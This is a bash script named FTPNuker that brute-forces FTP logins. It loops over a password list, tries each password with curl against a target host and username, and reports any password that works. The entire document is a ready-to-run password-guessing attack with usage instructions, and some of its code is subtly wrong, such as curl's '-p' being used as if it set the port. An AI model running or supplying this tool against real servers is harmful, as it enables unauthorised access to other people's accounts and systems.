#!/usr/bin/env bash

# Written by https://github.com/flashnuke

echo -e "\n  _____ _____ ____  _   _       _\n |  ___|_   _|  _ \| \ | |_   _| | _____ _ __\n | |_    | | | |_) |  \| | | | | |/ / _ \ '__|\n |  _|   | | |  __/| |\  | |_| |   <  __/ |\n |_|     |_| |_|   |_| \_|\__,_|_|\_\___|_|\n" 
echo "  Written by @flashnuke"
echo ""

_PORT=21 # modify if a differnt port is used
_TIMEOUT=1  # [sec] modify if a different timeout is desired
_SUCCESS_CODES=(225000,226000)
_PRINT_MOD_INTV=5
_DEL="===================================="

if [ "$#" -ne 3 ]
then
  echo "Usage: $0 ftp://target_host username path_to_passlist.txt"
  exit 1
fi

target_host=$1
username=$2
passwords_list=$3

_PASS_COUNT=$(wc -l < $passwords_list)

echo "[*] About to test $_PASS_COUNT passwords for username '$username' on target host '$target_host'"
echo $_DEL

start_time=$SECONDS
_CTR=0
for pass in $(cat $passwords_list)
do
	res=$(curl -s $1 -p $_PORT -u $username:$pass --connect-timeout $_TIMEOUT -w "%{http_code}")
	exists=$(echo $_SUCCESS_CODES | grep $res)
	if [ ! -z $exists ] 
	then
	        echo $_DEL
		echo ""	
		echo "[+] Found-> $pass"
		echo "[*] Elapsed -> $(( SECONDS - start_time ))[s]"
		echo ""
		exit 0
	else if ! ((_CTR++ % _PRINT_MOD_INTV))
	then
		echo "[*] Finished $_CTR out of $_PASS_COUNT, last attempt -> $pass"
	fi
	fi
done

echo $_DEL
echo ""
echo "[-] Failed to find password"
echo "[*] Elapsed -> $(( SECONDS - start_time ))[s]"
echo ""
